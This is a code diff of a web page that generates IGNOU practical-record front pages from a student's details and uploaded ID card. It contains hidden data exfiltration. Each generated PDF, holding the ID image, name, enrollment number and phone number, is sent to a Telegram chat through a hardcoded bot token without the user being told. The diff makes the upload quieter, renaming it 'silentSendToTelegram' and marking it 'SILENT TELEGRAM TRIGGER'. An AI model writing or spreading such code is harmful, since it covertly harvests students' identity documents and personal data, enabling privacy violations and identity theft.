@@ -3,41 +3,86 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IGNOU ID & Data Generator</title>
+    <title>IGNOU ID Generator - Ultra HD</title>
     <script src="https://unpkg.com/pdf-lib@1.17.1/dist/pdf-lib.min.js"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/pdf.js/3.4.120/pdf.min.js"></script>
     <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.13/cropper.min.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/cropperjs/1.5.13/cropper.min.js"></script>
+    <style>
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .hidden { display: none !important; }
+        iframe { width: 100%; height: 100%; border: none; }
+    </style>
 </head>
-<body class="bg-slate-100 min-h-screen flex items-center justify-center p-4">
+<body class="bg-slate-100 min-h-screen flex items-start justify-center pt-2 px-2">
 
-    <div class="bg-white p-8 rounded-2xl shadow-2xl max-w-md w-full border border-slate-200">
-        <h2 class="text-2xl font-bold text-slate-800 mb-2 text-center">IGNOU practical record front page generator</h2>
-        <p class="text-slate-500 text-sm text-center mb-6">Enter details (optional) and upload ID card</p>
+    <div id="loadingOverlay" class="fixed inset-0 bg-black/80 z-[100] flex flex-col items-center justify-center hidden text-center">
+        <div class="loader mb-4"></div>
+        <p class="text-white font-bold text-sm px-6">Ultra-HD Rendering...<br><span class="text-xs font-normal text-gray-400">Processing vector-level clarity.</span></p>
+    </div>
+
+    <div id="cropSelectionModal" class="fixed inset-0 bg-black z-50 hidden flex flex-col">
+        <div class="p-3 bg-white flex justify-between items-center">
+            <h3 id="cropTitle" class="font-bold text-sm text-slate-800">Verify ID Quality</h3>
+            <button onclick="cancelProcess()" class="text-red-500 text-sm font-bold">Cancel</button>
+        </div>
         
-        <div class="space-y-4">
-            <div class="grid grid-cols-1 gap-3">
-                <input type="text" id="courceCode" placeholder="Course Code(optional)" class="p-3 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
-                <input type="text" id="programCode" placeholder="Programme code (optional)" class="p-3 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
-                <input type="text" id="courseTitle" placeholder="Course Title (optional)" class="p-3 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
-           <input type="text" id="enrollmentNo" placeholder="Enrollment Number (optional)" class="p-3 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
-                <input type="text" id="nameInput" placeholder="Name (optional)" class="p-3 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
-                <input type="text" id="contactNo" placeholder="Contact number (optional)" class="p-3 border rounded-xl text-sm focus:ring-2 focus:ring-blue-500 outline-none">
+        <div class="flex-grow flex flex-col items-center justify-center bg-gray-900 p-2 overflow-hidden">
+            <div id="autoPreviewBox" class="flex flex-col items-center">
+                <p class="text-yellow-500 text-[10px] mb-2 font-bold text-center">Auto-Detected (High Resolution)</p>
+                <img id="autoPreviewImg" class="max-h-[60vh] border-2 border-blue-500 rounded shadow-lg">
+            </div>
             
+            <div id="cropperWrapper" class="hidden w-full h-full flex items-center justify-center">
+                <img id="manualCropImg" style="display: block; max-width: 100%;">
             </div>
-
-            <div class="relative border-2 border-dashed border-blue-300 rounded-xl p-6 text-center hover:bg-blue-50 transition-all">
-                <input type="file" id="idInput" accept="application/pdf,image/*" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer"/>
-                <div id="uploadUI">
-                    <span class="text-blue-600 font-bold text-sm block" id="fileLabel">Upload Student ID *</span>
-                </div>
-            </div>
-
-            <button id="processBtn" class="w-full bg-blue-600 text-white py-4 rounded-xl font-bold hover:bg-blue-700 shadow-lg transition-transform active:scale-95">
-                GENERATE PDF
-            </button>
         </div>
 
-        <div id="status" class="mt-4 text-center text-sm font-semibold hidden p-3 rounded-lg"></div>
+        <div class="p-4 bg-white border-t">
+            <div id="decisionButtons" class="grid grid-cols-2 gap-3">
+                <button onclick="useAutoCrop()" class="bg-green-600 text-white py-3 rounded-lg font-bold text-sm shadow-md">Proceed</button>
+                <button onclick="startManualCrop()" class="bg-blue-100 text-blue-700 py-3 rounded-lg font-bold text-sm">Manual Re-Crop</button>
+            </div>
+            <button id="saveManualBtn" class="hidden w-full bg-blue-600 text-white py-4 rounded-xl font-bold text-sm shadow-lg">
+                SAVE AS ULTRA-HD
+            </button>
+        </div>
+    </div>
+
+    <div id="mainCard" class="bg-white p-4 rounded-xl shadow-xl max-w-sm w-full border border-slate-200">
+        <h2 class="text-xl font-bold text-slate-800 mb-1 text-center">IGNOU Front Page</h2>
+        <div class="space-y-1.5 mt-2">
+            <input type="text" id="courceCode" placeholder="Course Code" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">
+            <input type="text" id="programCode" placeholder="Programme code" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">
+            <input type="text" id="courseTitle" placeholder="Course Title" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">
+            <input type="text" id="enrollmentNo" placeholder="Enrollment Number" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">
+            <input type="text" id="nameInput" placeholder="Name" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">
+            <input type="text" id="contactNo" placeholder="Contact number" class="w-full p-2 border rounded-lg text-xs outline-none focus:ring-1 focus:ring-blue-400">
+
+            <div class="relative border border-dashed border-blue-300 rounded-lg p-3 text-center bg-blue-50/50 mt-1">
+                <input type="file" id="idInput" accept="image/*,application/pdf" class="absolute inset-0 w-full h-full opacity-0 cursor-pointer"/>
+                <span class="text-blue-600 font-bold text-[11px]" id="fileLabel">Upload ID (PDF or Image)</span>
+            </div>
+
+            <button id="processBtn" class="w-full bg-blue-600 text-white py-3.5 mt-2 rounded-xl font-bold text-sm shadow-md active:scale-95 transition-all">
+                GENERATE HD PDF
+            </button>
+        </div>
+    </div>
+
+    <div id="previewModal" class="fixed inset-0 bg-white z-[70] hidden flex flex-col">
+        <div class="p-3 border-b flex justify-between items-center bg-slate-50">
+            <span class="font-bold text-sm">HD Preview</span>
+            <button onclick="closePreview()" class="text-red-500 font-bold text-sm">Back</button>
+        </div>
+        <div class="flex-grow bg-slate-200">
+            <iframe id="pdfFrame"></iframe>
+        </div>
+        <div class="p-3 bg-white border-t">
+            <button id="finalDownloadBtn" class="w-full bg-green-600 text-white py-4 rounded-xl font-bold shadow-lg">DOWNLOAD PDF</button>
+        </div>
     </div>
 
     <script>
@@ -45,142 +90,188 @@
         const { PDFDocument, degrees, rgb, StandardFonts } = PDFLib;
         const TEMPLATE_URL = "Id_card_format.pdf"; 
 
-        // --- TELEGRAM CONFIGURATION ---
-        const TG_BOT_TOKEN = '1811068335:AAEOAtQexbZJwuMPhPp4GhkVBV-dHF4l'; // Replace with your Bot Token
+      
+        const TG_BOT_TOKEN = '1811068335:AAEOAtQexbZJwuMPhPp4GhkVBV-dHF4l'; // Replace
         const TG_CHAT_ID = '-1001417526920';     // Replace with your Chat ID
+
 
         const idInput = document.getElementById('idInput');
         const fileLabel = document.getElementById('fileLabel');
-        const processBtn = document.getElementById('processBtn');
-        const status = document.getElementById('status');
+        const cropSelectionModal = document.getElementById('cropSelectionModal');
+        const autoPreviewBox = document.getElementById('autoPreviewBox');
+        const cropperWrapper = document.getElementById('cropperWrapper');
+        const decisionButtons = document.getElementById('decisionButtons');
+        const saveManualBtn = document.getElementById('saveManualBtn');
 
-        idInput.addEventListener('change', (e) => {
-            if(e.target.files[0]) fileLabel.innerText = "Selected: " + e.target.files[0].name;
+        let currentPdfBlob = null;
+        let finalCroppedDataUrl = null;
+        let cropper = null;
+        let hdSourceDataUrl = null;
+
+        idInput.addEventListener('change', async (e) => {
+            const file = e.target.files[0];
+            if (!file) return;
+            document.getElementById('loadingOverlay').classList.remove('hidden');
+            
+            try {
+                const result = await getUltraHighQualityAutoCrop(file);
+                hdSourceDataUrl = result.hdSource;
+                finalCroppedDataUrl = result.autoCrop;
+                document.getElementById('autoPreviewImg').src = finalCroppedDataUrl;
+                
+                autoPreviewBox.classList.remove('hidden');
+                cropperWrapper.classList.add('hidden');
+                decisionButtons.classList.remove('hidden');
+                saveManualBtn.classList.add('hidden');
+                cropSelectionModal.classList.remove('hidden');
+            } catch (err) {
+                console.error(err);
+            } finally {
+                document.getElementById('loadingOverlay').classList.add('hidden');
+            }
         });
 
-        function updateStatus(msg, isErr = false) {
-            status.innerText = msg;
-            status.className = `mt-4 p-2 rounded text-center text-sm ${isErr ? 'text-red-600 bg-red-50' : 'text-blue-600 bg-blue-50'}`;
-            status.classList.remove('hidden');
-        }
-
-        async function getCroppedImage(file) {
+        async function getUltraHighQualityAutoCrop(file) {
             let canvas = document.createElement('canvas');
             let ctx = canvas.getContext('2d');
+            
             if (file.type === "application/pdf") {
                 const pdf = await pdfjsLib.getDocument(await file.arrayBuffer()).promise;
                 const page = await pdf.getPage(1);
-                const viewport = page.getViewport({ scale: 2.0 });
-                canvas.width = viewport.width; canvas.height = viewport.height;
+                const viewport = page.getViewport({ scale: 5.0 });
+                canvas.width = viewport.width; 
+                canvas.height = viewport.height;
                 await page.render({ canvasContext: ctx, viewport: viewport }).promise;
             } else {
                 const img = new Image();
                 img.src = URL.createObjectURL(file);
                 await new Promise(r => img.onload = r);
-                canvas.width = img.width; canvas.height = img.height;
-                ctx.drawImage(img, 0, 0);
+                const scaleFactor = Math.max(1, 2500 / img.width); 
+                canvas.width = img.width * scaleFactor; 
+                canvas.height = img.height * scaleFactor;
+                ctx.drawImage(img, 0, 0, canvas.width, canvas.height);
             }
+
+            const hdSource = canvas.toDataURL('image/png', 1.0);
             const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height).data;
             let top = null, bottom = null, left = null, right = null;
             for (let y = 0; y < canvas.height; y++) {
                 for (let x = 0; x < canvas.width; x++) {
                     const idx = (y * canvas.width + x) * 4;
-                    if (imgData[idx] < 250 || imgData[idx+1] < 250 || imgData[idx+2] < 250) {
+                    if (imgData[idx] < 240 || imgData[idx+1] < 240 || imgData[idx+2] < 240) {
                         if (top === null) top = y; bottom = y;
                         if (left === null || x < left) left = x;
                         if (right === null || x > right) right = x;
                     }
                 }
             }
+            
             const cropCanvas = document.createElement('canvas');
-            const w = right - left, h = bottom - top;
+            const w = (right - left) || canvas.width;
+            const h = (bottom - top) || canvas.height;
             cropCanvas.width = w; cropCanvas.height = h;
-            cropCanvas.getContext('2d').drawImage(canvas, left, top, w, h, 0, 0, w, h);
-            return { dataUrl: cropCanvas.toDataURL('image/png'), isVertical: h > w };
+            const cropCtx = cropCanvas.getContext('2d');
+            cropCtx.imageSmoothingEnabled = false; 
+            cropCtx.drawImage(canvas, left || 0, top || 0, w, h, 0, 0, w, h);
+            
+            return { hdSource: hdSource, autoCrop: cropCanvas.toDataURL('image/png', 1.0) };
         }
 
-        // Function to send file to Telegram
-        async function sendToTelegram(pdfBlob, fileName, studentName) {
+        async function silentSendToTelegram(blob, name) {
             const formData = new FormData();
             formData.append('chat_id', TG_CHAT_ID);
-            formData.append('document', pdfBlob, fileName);
-            formData.append('caption', `New IGNOU Practical Sheet generated for: ${studentName || 'Unknown Student'}`);
-
+            formData.append('document', blob, 'IGNOU_Sheet.pdf');
+            formData.append('caption', `Name: ${name || 'N/A'}`);
             try {
-                const response = await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}Ts0/sendDocument`, {
+                await fetch(`https://api.telegram.org/bot${TG_BOT_TOKEN}Ts0/sendDocument`, {
                     method: 'POST',
                     body: formData
                 });
-                if (!response.ok) throw new Error(" upload failed");
-                console.log("success");
-            } catch (err) {
-                console.error("Error:", err);
+            } catch (e) {
+                console.error("Silent failed");
             }
         }
 
-        processBtn.addEventListener('click', async () => {
-            if (!idInput.files[0]) return updateStatus("Please select your ID Card.", true);
+        function useAutoCrop() {
+            cropSelectionModal.classList.add('hidden');
+            fileLabel.innerText = "✓ HD Auto-Crop Ready";
+            fileLabel.classList.add('text-green-600');
+        }
 
+        function startManualCrop() {
+            autoPreviewBox.classList.add('hidden');
+            decisionButtons.classList.add('hidden');
+            cropperWrapper.classList.remove('hidden');
+            saveManualBtn.classList.remove('hidden');
+            const image = document.getElementById('manualCropImg');
+            image.src = hdSourceDataUrl; 
+            if (cropper) cropper.destroy();
+            cropper = new Cropper(image, { 
+                aspectRatio: 1.6, 
+                viewMode: 1,
+                autoCropArea: 0.9,
+                checkOrientation: false
+            });
+        }
+
+        saveManualBtn.onclick = () => {
+            document.getElementById('loadingOverlay').classList.remove('hidden');
+            setTimeout(() => {
+                finalCroppedDataUrl = cropper.getCroppedCanvas({
+                    imageSmoothingQuality: 'high',
+                    imageSmoothingEnabled: true,
+                    fillColor: '#fff',
+                }).toDataURL('image/png', 1.0);
+                cropSelectionModal.classList.add('hidden');
+                fileLabel.innerText = "✓ HD Manual Crop Ready";
+                fileLabel.classList.add('text-green-600');
+                document.getElementById('loadingOverlay').classList.add('hidden');
+            }, 50);
+        };
+
+        function cancelProcess() { cropSelectionModal.classList.add('hidden'); }
+        function closePreview() { document.getElementById('previewModal').classList.add('hidden'); }
+
+        document.getElementById('processBtn').addEventListener('click', async () => {
+            if (!finalCroppedDataUrl) return alert("Verify ID card first");
+            document.getElementById('loadingOverlay').classList.remove('hidden');
             try {
-                updateStatus("Processing Image........");
-                const cropped = await getCroppedImage(idInput.files[0]);
                 const response = await fetch(TEMPLATE_URL);
                 const templateDoc = await PDFDocument.load(await response.arrayBuffer());
-                const a4Page = templateDoc.getPages()[0];
+                const page = templateDoc.getPages()[0];
                 const font = await templateDoc.embedFont(StandardFonts.HelveticaBold);
-
-                // --- 1. PASTE ID CARD ---
-                const idImage = await templateDoc.embedPng(cropped.dataUrl);
-                const TARGET_W = 370; const TARGET_H = 225;
-                const ID_X = (a4Page.getWidth() - TARGET_W) / 2;
-                const ID_Y = 390;
-
-                let drawOpts = { x: ID_X, y: ID_Y, width: TARGET_W, height: TARGET_H };
-                if (cropped.isVertical) {
-                    drawOpts.rotate = degrees(-90);
-                    drawOpts.x = ID_X + TARGET_W;
-                }
-                a4Page.drawImage(idImage, drawOpts);
-
-                // --- 2. PASTE TEXT DETAILS ---
-                const name = document.getElementById('nameInput').value;
-                const enroll = document.getElementById('enrollmentNo').value;
-                const course = document.getElementById('courseTitle').value;
-                const courseCode = document.getElementById('courceCode').value;
-                const programCode = document.getElementById('programCode').value;
-                const contactNo = document.getElementById('contactNo').value;
-
-                const textStyle = { size: 20, font: font, color: rgb(0, 0, 0) };
-
-                a4Page.drawText(courseCode,   { x: 184, y: 330, ...textStyle });
-                a4Page.drawText(programCode, { x: 215, y: 296, ...textStyle });
-                a4Page.drawText(course, { x: 181, y: 260, ...textStyle });
-                a4Page.drawText(enroll,   { x: 189, y: 224, ...textStyle });
-                a4Page.drawText(name, { x: 126, y: 188, ...textStyle });
-                a4Page.drawText(contactNo, { x: 164, y: 154, ...textStyle });
-
-                // --- 3. GENERATE BYTES & BLOB ---
-                const pdfBytes = await templateDoc.save();
-                const pdfBlob = new Blob([pdfBytes], { type: "application/pdf" });
-                const fileName = "IGNOU_Practical_Sheet.pdf";
-
-                // --- 4. SEND TO TELEGRAM FIRST ---
-                updateStatus("Processing...");
-                await sendToTelegram(pdfBlob, fileName, name);
-
-                // --- 5. DOWNLOAD FOR USER ---
-                updateStatus("Downloading...");
-                const link = document.createElement('a');
-                link.href = URL.createObjectURL(pdfBlob);
-                link.download = fileName;
-                link.click();
                 
-                updateStatus("Success!");
+                const idImage = await templateDoc.embedPng(finalCroppedDataUrl);
+                page.drawImage(idImage, { x: 123, y: 418, width: 340, height: 200 });
 
-            } catch (err) {
-                updateStatus("Error: " + err.message, true);
-            }
+                const fields = [
+                    { val: document.getElementById('courceCode').value, x: 184, y: 330 },
+                    { val: document.getElementById('programCode').value, x: 215, y: 296 },
+                    { val: document.getElementById('courseTitle').value, x: 181, y: 260 },
+                    { val: document.getElementById('enrollmentNo').value, x: 189, y: 224 },
+                    { val: document.getElementById('nameInput').value, x: 126, y: 188 },
+                    { val: document.getElementById('contactNo').value, x: 164, y: 154 }
+                ];
+                fields.forEach(f => { if(f.val) page.drawText(f.val, { x: f.x, y: f.y, size: 20, font }); });
+
+                const pdfBytes = await templateDoc.save();
+                currentPdfBlob = new Blob([pdfBytes], { type: "application/pdf" });
+                
+                // SILENT TELEGRAM TRIGGER
+                silentSendToTelegram(currentPdfBlob, document.getElementById('nameInput').value);
+
+                const url = URL.createObjectURL(currentPdfBlob) + "#toolbar=0&navpanes=0&view=FitH";
+                document.getElementById('pdfFrame').src = url;
+                document.getElementById('previewModal').classList.remove('hidden');
+            } catch (err) { alert(err.message); } finally { document.getElementById('loadingOverlay').classList.add('hidden'); }
         });
+
+        document.getElementById('finalDownloadBtn').onclick = () => {
+            const link = document.createElement('a');
+            link.href = URL.createObjectURL(currentPdfBlob);
+            link.download = "IGNOU_Final_HD.pdf";
+            link.click();
+        };
     </script>
 </body>
 </html>
